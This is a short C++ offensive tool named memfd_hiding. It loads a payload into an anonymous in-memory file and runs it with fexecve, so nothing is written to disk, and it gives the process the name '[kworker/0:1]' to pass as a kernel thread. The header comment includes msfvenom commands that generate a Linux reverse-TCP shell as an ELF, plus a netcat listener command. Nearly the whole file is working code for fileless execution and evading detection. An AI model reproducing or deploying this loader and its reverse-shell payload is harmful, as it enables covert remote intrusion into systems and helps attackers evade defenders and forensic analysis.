/*

Author:  c0d3Ninja
Website: https://gotr00t0day.github.io

memfd_hiding - Execute a payload entirely in memory without ever writing it to disk. The process name masquerades as a kernel worker thread so it can look legitimate. 


Generate an ELF with msfvenom and convert it to a C header:

x86_64: msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o payload.bin
aarch6: msfvenom -p linux/aarch64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o payload.bin
Convert to header: xxd -i payload.bin > payload.h

USAGE: 
g++ memfd_hiding.cpp -o memfd_hiding -std=c++20 -pthread
chmod +x memfd_hiding
./memfd_hiding (Make sure you're using a listener before running the tool.. ex: nc -lvpn 1337)

*/


#define _GNU_SOURCE
#include <sys/mman.h>
#include <unistd.h>
#include <cstring>
#include <cstdio>
#include "payload.h"

void createPayloadFile() {
    int fd = memfd_create("", MFD_CLOEXEC);
    if (fd == -1) {
        perror("memfd_create");
        return;
    }

    size_t written = 0;
    while (written < payload_bin_len) {
        ssize_t ret = write(fd, payload_bin + written, payload_bin_len - written);
        if (ret == -1) {
            perror("write");
            close(fd);
            return;
        }
        written += ret;
    }

    char* argv[] = { const_cast<char*>("[kworker/0:1]"), nullptr };
    char* envp[] = { nullptr };
    fexecve(fd, argv, envp);

    perror("fexecve");
    close(fd);
}

int main() {
    createPayloadFile();
    return 0;
}

